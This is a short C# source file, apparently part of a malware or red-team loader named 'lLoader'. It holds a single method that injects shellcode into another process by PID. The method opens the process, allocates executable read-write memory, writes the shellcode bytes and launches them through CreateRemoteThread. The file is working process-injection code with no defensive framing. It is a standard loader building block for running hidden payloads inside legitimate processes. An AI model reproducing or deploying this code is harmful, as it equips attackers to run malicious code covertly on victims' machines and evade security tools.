using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace lLoader
{
    public class Runner
    {

        public static IntPtr Inject(byte[] shellcode, int procPID)
        {
            IntPtr procHandle = WinAPI.OpenProcess(WinAPI.PROCESS_CREATE_THREAD | WinAPI.PROCESS_QUERY_INFORMATION | WinAPI.PROCESS_VM_OPERATION | WinAPI.PROCESS_VM_WRITE | WinAPI.PROCESS_VM_READ, false, procPID);

            IntPtr allocMemAddress = WinAPI.VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            WinAPI.WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);


            IntPtr threadHandle = IntPtr.Zero;
            IntPtr remoteThreadId;

            threadHandle = WinAPI.CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, out remoteThreadId);

            if (threadHandle == IntPtr.Zero) { return IntPtr.Zero; }

            return remoteThreadId;

        }

    }
}
